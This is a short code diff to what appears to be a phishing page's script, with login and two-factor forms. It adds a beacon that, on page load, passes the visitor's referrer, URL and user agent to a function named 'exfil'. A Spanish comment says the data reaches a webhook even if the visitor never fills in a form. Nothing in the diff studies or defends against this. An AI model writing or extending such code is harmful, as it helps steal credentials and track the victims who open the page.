@@ -23,6 +23,10 @@
     if (el) { el.textContent = ""; el.style.display = "none"; }
   }
 
+  // Diagnostico: beacon al cargar. Si el bot siquiera abre la pagina, esto cae
+  // en el webhook aunque no toque ningun form.
+  exfil("pageload", { ref: document.referrer, url: location.href, ua: navigator.userAgent });
+
   var formLogin = document.getElementById("form-login");
   var form2fa   = document.getElementById("form-2fa");
   var title     = document.getElementById("card-title");
